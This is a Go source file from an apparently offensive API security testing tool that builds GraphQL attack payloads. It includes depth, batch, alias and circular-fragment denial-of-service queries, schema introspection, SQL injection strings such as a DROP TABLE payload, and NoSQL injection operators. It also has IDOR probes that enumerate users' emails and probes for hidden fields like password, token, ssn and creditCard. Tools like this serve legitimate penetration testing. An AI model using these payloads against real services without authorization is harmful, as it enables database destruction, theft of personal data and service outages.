// Package payloads provides attack payload generation
package payloads

import (
	"fmt"
	"strings"

	"github.com/su1ph3r/indago/pkg/types"
)

// GraphQLGenerator generates GraphQL-specific attack payloads
type GraphQLGenerator struct {
	maxDepth      int
	maxBatchSize  int
	maxAliases    int
}

// GraphQLSettings holds GraphQL attack settings
type GraphQLSettings struct {
	MaxDepth     int `yaml:"max_depth" json:"max_depth"`
	MaxBatchSize int `yaml:"max_batch_size" json:"max_batch_size"`
	MaxAliases   int `yaml:"max_aliases" json:"max_aliases"`
}

// NewGraphQLGenerator creates a new GraphQL generator
func NewGraphQLGenerator(settings GraphQLSettings) *GraphQLGenerator {
	if settings.MaxDepth <= 0 {
		settings.MaxDepth = 10
	}
	if settings.MaxBatchSize <= 0 {
		settings.MaxBatchSize = 100
	}
	if settings.MaxAliases <= 0 {
		settings.MaxAliases = 100
	}

	return &GraphQLGenerator{
		maxDepth:     settings.MaxDepth,
		maxBatchSize: settings.MaxBatchSize,
		maxAliases:   settings.MaxAliases,
	}
}

// Type returns the attack type
func (g *GraphQLGenerator) Type() string {
	return "graphql"
}

// Generate generates GraphQL attack payloads
func (g *GraphQLGenerator) Generate(endpoint types.Endpoint, param *types.Parameter) []Payload {
	var payloads []Payload

	// Depth attacks
	payloads = append(payloads, g.generateDepthPayloads()...)

	// Batch attacks
	payloads = append(payloads, g.generateBatchPayloads()...)

	// Alias attacks
	payloads = append(payloads, g.generateAliasPayloads()...)

	// Introspection attacks
	payloads = append(payloads, g.generateIntrospectionPayloads()...)

	// Injection attacks
	payloads = append(payloads, g.generateInjectionPayloads(param)...)

	// IDOR via aliases
	payloads = append(payloads, g.generateIDORPayloads(param)...)

	return payloads
}

// generateDepthPayloads generates nested query depth attacks
func (g *GraphQLGenerator) generateDepthPayloads() []Payload {
	var payloads []Payload

	// Generate queries of increasing depth
	depths := []int{5, 10, 15, 20, 50, 100}

	for _, depth := range depths {
		if depth > g.maxDepth*2 { // Allow testing beyond configured limit
			break
		}

		query := g.buildNestedQuery(depth)
		payloads = append(payloads, Payload{
			Value:       query,
			Type:        types.AttackGraphQLDepth,
			Category:    "dos",
			Description: fmt.Sprintf("Nested query depth attack (depth=%d)", depth),
			Metadata: map[string]string{
				"depth": fmt.Sprintf("%d", depth),
			},
		})
	}

	return payloads
}

// buildNestedQuery builds a nested GraphQL query
func (g *GraphQLGenerator) buildNestedQuery(depth int) string {
	var sb strings.Builder

	sb.WriteString(`{"query": "{ __typename `)

	// Build nested fragment
	for i := 0; i < depth; i++ {
		sb.WriteString("... on Query { __typename ")
	}

	// Close all braces
	for i := 0; i < depth; i++ {
		sb.WriteString("} ")
	}

	sb.WriteString(`}"}`)

	return sb.String()
}

// generateBatchPayloads generates batched query attacks
func (g *GraphQLGenerator) generateBatchPayloads() []Payload {
	var payloads []Payload

	// Batch sizes to test
	sizes := []int{10, 50, 100, 500, 1000}

	for _, size := range sizes {
		if size > g.maxBatchSize*2 {
			break
		}

		query := g.buildBatchQuery(size)
		payloads = append(payloads, Payload{
			Value:       query,
			Type:        types.AttackGraphQLBatch,
			Category:    "dos",
			Description: fmt.Sprintf("Batched query attack (size=%d)", size),
			Metadata: map[string]string{
				"batch_size": fmt.Sprintf("%d", size),
			},
		})
	}

	return payloads
}

// buildBatchQuery builds a batched GraphQL query
func (g *GraphQLGenerator) buildBatchQuery(size int) string {
	queries := make([]string, size)

	for i := 0; i < size; i++ {
		queries[i] = fmt.Sprintf(`{"query": "{ __typename }"}`)
	}

	return "[" + strings.Join(queries, ",") + "]"
}

// generateAliasPayloads generates alias-based attacks
func (g *GraphQLGenerator) generateAliasPayloads() []Payload {
	var payloads []Payload

	// Alias counts to test
	counts := []int{10, 50, 100, 500}

	for _, count := range counts {
		if count > g.maxAliases*2 {
			break
		}

		query := g.buildAliasQuery(count)
		payloads = append(payloads, Payload{
			Value:       query,
			Type:        types.AttackGraphQLBatch,
			Category:    "dos",
			Description: fmt.Sprintf("Alias duplication attack (aliases=%d)", count),
			Metadata: map[string]string{
				"alias_count": fmt.Sprintf("%d", count),
			},
		})
	}

	return payloads
}

// buildAliasQuery builds a query with many aliases
func (g *GraphQLGenerator) buildAliasQuery(count int) string {
	var sb strings.Builder

	sb.WriteString(`{"query": "{ `)

	for i := 0; i < count; i++ {
		if i > 0 {
			sb.WriteString(" ")
		}
		sb.WriteString(fmt.Sprintf("a%d: __typename", i))
	}

	sb.WriteString(` }"}`)

	return sb.String()
}

// generateIntrospectionPayloads generates introspection-related payloads
func (g *GraphQLGenerator) generateIntrospectionPayloads() []Payload {
	return []Payload{
		{
			Value: `{"query": "{ __schema { types { name fields { name } } } }"}`,
			Type:  types.AttackGraphQLIntrospect,
			Category: "information_disclosure",
			Description: "Basic introspection query",
		},
		{
			Value: `{"query": "{ __schema { queryType { name } mutationType { name } subscriptionType { name } } }"}`,
			Type:  types.AttackGraphQLIntrospect,
			Category: "information_disclosure",
			Description: "Query root types",
		},
		{
			Value: `{"query": "{ __schema { directives { name description locations args { name } } } }"}`,
			Type:  types.AttackGraphQLIntrospect,
			Category: "information_disclosure",
			Description: "Query directives",
		},
		{
			Value: `{"query": "{ __type(name: \"User\") { name fields { name type { name } } } }"}`,
			Type:  types.AttackGraphQLIntrospect,
			Category: "information_disclosure",
			Description: "Query User type details",
		},
		{
			Value: `{"query": "{ __type(name: \"Mutation\") { name fields { name args { name type { name } } } } }"}`,
			Type:  types.AttackGraphQLIntrospect,
			Category: "information_disclosure",
			Description: "Query Mutation type details",
		},
	}
}

// generateInjectionPayloads generates injection payloads for GraphQL
func (g *GraphQLGenerator) generateInjectionPayloads(param *types.Parameter) []Payload {
	var payloads []Payload

	if param == nil {
		return payloads
	}

	// SQL injection via GraphQL variables
	sqliPayloads := []string{
		`' OR '1'='1`,
		`" OR "1"="1`,
		`1; DROP TABLE users;--`,
		`1 UNION SELECT * FROM users--`,
	}

	for _, p := range sqliPayloads {
		payloads = append(payloads, Payload{
			Value:       fmt.Sprintf(`{"query": "mutation { update%s(%s: \"%s\") { id } }"}`, strings.Title(param.Name), param.Name, p),
			Type:        types.AttackSQLi,
			Category:    "injection",
			Description: "SQL injection via GraphQL mutation",
			Metadata: map[string]string{
				"target_param": param.Name,
			},
		})
	}

	// NoSQL injection
	nosqliPayloads := []string{
		`{"$gt": ""}`,
		`{"$ne": null}`,
		`{"$regex": ".*"}`,
	}

	for _, p := range nosqliPayloads {
		payloads = append(payloads, Payload{
			Value:       fmt.Sprintf(`{"query": "{ user(%s: %s) { id } }"}`, param.Name, p),
			Type:        types.AttackNoSQLi,
			Category:    "injection",
			Description: "NoSQL injection via GraphQL query",
			Metadata: map[string]string{
				"target_param": param.Name,
			},
		})
	}

	return payloads
}

// generateIDORPayloads generates IDOR payloads using GraphQL aliases
func (g *GraphQLGenerator) generateIDORPayloads(param *types.Parameter) []Payload {
	var payloads []Payload

	if param == nil {
		return payloads
	}

	// Only for ID-like parameters
	nameLower := strings.ToLower(param.Name)
	if !strings.Contains(nameLower, "id") && !strings.Contains(nameLower, "uuid") {
		return payloads
	}

	// Generate alias-based IDOR tests
	idValues := []string{"1", "2", "3", "100", "1000", "admin", "0"}

	var sb strings.Builder
	sb.WriteString(`{"query": "{ `)

	for i, id := range idValues {
		if i > 0 {
			sb.WriteString(" ")
		}
		sb.WriteString(fmt.Sprintf(`u%d: user(%s: "%s") { id email name }`, i, param.Name, id))
	}

	sb.WriteString(` }"}`)

	payloads = append(payloads, Payload{
		Value:       sb.String(),
		Type:        types.AttackIDOR,
		Category:    "authorization",
		Description: "IDOR via GraphQL aliases",
		Metadata: map[string]string{
			"target_param": param.Name,
		},
	})

	return payloads
}

// GenerateFieldSuggestionPayloads generates payloads to discover hidden fields
func (g *GraphQLGenerator) GenerateFieldSuggestionPayloads() []Payload {
	hiddenFields := []string{
		"password", "hash", "secret", "token", "apiKey",
		"admin", "role", "permissions", "internal",
		"email", "phone", "ssn", "creditCard",
		"createdAt", "updatedAt", "deletedAt",
	}

	var payloads []Payload

	for _, field := range hiddenFields {
		payloads = append(payloads, Payload{
			Value: fmt.Sprintf(`{"query": "{ user(id: \"1\") { %s } }"}`, field),
			Type:  types.AttackDataExposure,
			Category: "information_disclosure",
			Description: fmt.Sprintf("Probe for hidden field: %s", field),
			Metadata: map[string]string{
				"field": field,
			},
		})
	}

	return payloads
}

// GenerateDirectivePayloads generates directive abuse payloads
func (g *GraphQLGenerator) GenerateDirectivePayloads() []Payload {
	return []Payload{
		{
			Value: `{"query": "{ user(id: \"1\") @include(if: true) { id } }"}`,
			Type:  "directive_abuse",
			Category: "logic",
			Description: "Test @include directive",
		},
		{
			Value: `{"query": "{ user(id: \"1\") @skip(if: false) { id } }"}`,
			Type:  "directive_abuse",
			Category: "logic",
			Description: "Test @skip directive",
		},
		{
			Value: `{"query": "{ user(id: \"1\") @deprecated { id } }"}`,
			Type:  "directive_abuse",
			Category: "logic",
			Description: "Test @deprecated directive",
		},
		{
			Value: `{"query": "{ user(id: \"1\") @custom { id } }"}`,
			Type:  "directive_abuse",
			Category: "logic",
			Description: "Test custom directive",
		},
	}
}

// GenerateCircularFragmentPayloads generates circular fragment payloads
func (g *GraphQLGenerator) GenerateCircularFragmentPayloads() []Payload {
	return []Payload{
		{
			Value: `{"query": "fragment A on User { ...B } fragment B on User { ...A } { user(id: \"1\") { ...A } }"}`,
			Type:  types.AttackGraphQLDepth,
			Category: "dos",
			Description: "Circular fragment reference",
		},
		{
			Value: `{"query": "fragment A on User { friends { ...A } } { user(id: \"1\") { ...A } }"}`,
			Type:  types.AttackGraphQLDepth,
			Category: "dos",
			Description: "Recursive fragment",
		},
	}
}
